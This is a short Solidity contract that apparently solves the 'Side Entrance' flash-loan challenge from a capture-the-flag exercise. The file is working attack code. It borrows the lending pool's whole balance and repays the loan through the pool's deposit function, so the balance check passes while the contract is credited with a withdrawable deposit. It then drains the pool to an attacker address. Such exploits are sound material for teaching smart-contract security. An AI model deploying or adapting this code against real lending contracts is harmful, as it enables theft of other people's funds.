// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolExploit{
    using Address for address payable;

    SideEntranceLenderPool public lenderPool;
    address payable public attacker;
    
    constructor(address _lenderPool, address payable _attacker){
        lenderPool = SideEntranceLenderPool(_lenderPool);
        attacker = _attacker;
    }

    function pwn() public {
        uint256 balance = address(lenderPool).balance;
        lenderPool.flashLoan(balance);
        lenderPool.withdraw();
        attacker.sendValue(address(this).balance);
    }

    //We give the flashloan back via the deposit function, therefore not changing the contract's balance, 
    //but also enabling us to withdraw the whole amount
    function execute() public payable{
        lenderPool.deposit{value: msg.value}();
    }

    receive() payable external{}
}